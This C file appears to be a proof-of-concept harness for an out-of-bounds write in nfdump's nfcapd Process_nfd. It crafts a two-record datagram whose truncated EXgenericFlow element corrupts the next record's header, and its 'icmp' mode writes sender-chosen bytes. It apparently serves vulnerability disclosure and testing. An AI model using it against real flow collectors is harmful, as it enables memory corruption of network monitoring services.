/*
 * nfdump2shell — faithful receive-buffer shape for the pinned Process_nfd.
 *
 * The staged driver allocates the single 48-byte packet exactly, so the
 * truncated-EXgenericFlow store lands in a synthetic trailing canary. Real
 * nfcapd processes a datagram inside a large reusable receive buffer; when a
 * datagram carries more than one V3 record, the store at element payload
 * offset 16 lands on the header of the NEXT record in the same buffer.
 *
 * This file reuses every stand-in and verbatim pin from driver.c by including
 * it with main renamed, then drives Process_nfd with a two-record datagram in
 * a 64 KiB buffer (the real caller shape). No socket is used.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define main driver_unused_main
#include "driver.c"
#undef main

int main(int argc, char **argv) {
    const char *mode = argc > 1 ? argv[1] : "attack";
    const int safe = strcmp(mode, "safe") == 0;
    const int icmp = strcmp(mode, "icmp") == 0;

    enum { RXBUFSZ = 65536 };
    unsigned char *rx = (unsigned char *)malloc(RXBUFSZ);
    if (!rx) return 2;
    memset(rx, 0xa5, RXBUFSZ); /* stale receive-buffer bytes */

    const uint16_t elem_len = safe ? (uint16_t)EXgenericFlowSize : (uint16_t)(4 + 16);
    const size_t r1sz = sizeof(recordHeaderV3_t) + elem_len;
    const size_t r2sz = sizeof(recordHeaderV3_t) + EXgenericFlowSize;
    const size_t total = sizeof(nfd_header_t) + r1sz + r2sz; /* 112 attack/icmp, 144 safe */

    nfd_header_t *nh = (nfd_header_t *)rx;
    nh->version = htons(VERSION_NFDUMP);
    nh->length = htons((uint16_t)total);
    nh->exportTime = htonl(1764000000u);
    nh->lastSequence = htonl(1);
    nh->numRecord = htonl(2);

    recordHeaderV3_t *r1 = (recordHeaderV3_t *)(rx + sizeof(nfd_header_t));
    memset(r1, 0, sizeof(*r1));
    r1->type = V3Record;
    r1->size = (uint16_t)r1sz;
    r1->numElements = 1;
    r1->nfversion = 3;
    elementHeader_t *e1 = (elementHeader_t *)((void *)r1 + sizeof(recordHeaderV3_t));
    e1->type = EXgenericFlowID;
    e1->length = elem_len;
    unsigned char *p1 = (unsigned char *)e1 + sizeof(elementHeader_t);
    memset(p1, 0x11, elem_len - sizeof(elementHeader_t));
    if (safe) {
        EXgenericFlow_t *gf1 = (EXgenericFlow_t *)p1;
        gf1->proto = IPPROTO_TCP;
        gf1->inPackets = 3;
        gf1->inBytes = 180;
    }

    /* Record 2 is a complete, valid V3 record parked immediately after r1. */
    recordHeaderV3_t *r2 = (recordHeaderV3_t *)((void *)r1 + r1sz);
    memset(r2, 0, sizeof(*r2));
    r2->type = V3Record;
    r2->size = (uint16_t)r2sz;
    r2->numElements = 1;
    r2->nfversion = 3;
    elementHeader_t *e2 = (elementHeader_t *)((void *)r2 + sizeof(recordHeaderV3_t));
    e2->type = EXgenericFlowID;
    e2->length = EXgenericFlowSize;
    unsigned char *p2 = (unsigned char *)e2 + sizeof(elementHeader_t);
    memset(p2, 0, sizeof(EXgenericFlow_t));
    EXgenericFlow_t *gf2 = (EXgenericFlow_t *)p2;
    gf2->proto = IPPROTO_TCP;
    gf2->inPackets = 5;
    gf2->inBytes = 500;
    if (icmp) {
        /* The truncated element's EXgenericFlow view p1 is 32 bytes before
         * record 2's payload p2 (p2-p1 == 32). Its srcPort@40, dstPort@42 and
         * proto@44 alias p2+8, p2+10 and p2+12: bytes the next record's sender
         * chose. The pinned ICMP swap therefore writes chosen bytes past the
         * 16-byte truncated element. */
        p2[8] = 0xde;
        p2[9] = 0xad;
        p2[10] = 0x5a;
        p2[11] = 0x5a;
        p2[12] = IPPROTO_ICMP;
    }

    FlowSource_t fs;
    memset(&fs, 0, sizeof(fs));
    fs.sa_family = PF_INET;
    fs.ipAddr.bytes[12] = 127;
    fs.ipAddr.bytes[15] = 1;
    fs.received.tv_sec = 0x54415554; /* same chosen source as the staged driver */
    fs.received.tv_usec = 123000;

    stat_record_t stats;
    memset(&stats, 0, sizeof(stats));
    nffile_t nffile = {.stat_record = &stats, .ident = NULL};
    dataBlock_t *block = (dataBlock_t *)malloc(sizeof(dataBlock_t) + WRITE_BUFFSIZE);
    if (!block) return 2;
    memset(block, 0, sizeof(dataBlock_t) + WRITE_BUFFSIZE);
    fs.dataBlock = block;
    fs.nffile = &nffile;

    uint64_t expect = ((uint64_t)fs.received.tv_sec * 1000ULL) + (uint64_t)(fs.received.tv_usec / 1000ULL);

    printf("MODE=%s VULN=%d TOTAL=%zu R1SZ=%zu R2_OFF=%zu STORE_OFF=%zu\n",
           mode, VULN, total, r1sz, (size_t)((unsigned char *)r2 - rx),
           (size_t)((unsigned char *)p1 + __builtin_offsetof(EXgenericFlow_t, msecReceived) - rx));
    printf("EXPECTED_BYTES=");
    hexdump8((const unsigned char *)&expect);
    printf("\nR2_HDR_BEFORE=");
    hexdump8((const unsigned char *)r2);
    printf("\n");
    if (icmp) {
        printf("P2_BYTES_BEFORE=");
        hexdump8(p2 + 8);
        printf("\n");
    }

    VerifyV3Record(r1);
    Process_nfd(rx, (ssize_t)total, &fs);

    printf("R2_HDR_AFTER=");
    hexdump8((const unsigned char *)r2);
    printf("\nR2_TYPE=%u R2_SIZE=%u R2_NUMELEM=%u\n", r2->type, r2->size, r2->numElements);
    if (icmp) {
        printf("P2_BYTES_AFTER=");
        hexdump8(p2 + 8);
        printf("\n");
    }
    printf("BLOCK_SIZE=%u NUM_RECORDS=%u FLOWS=%llu\n",
           block->size, block->NumRecords, (unsigned long long)fs.exporter.flows);

    free(rx);
    free(block);
    return 0;
}
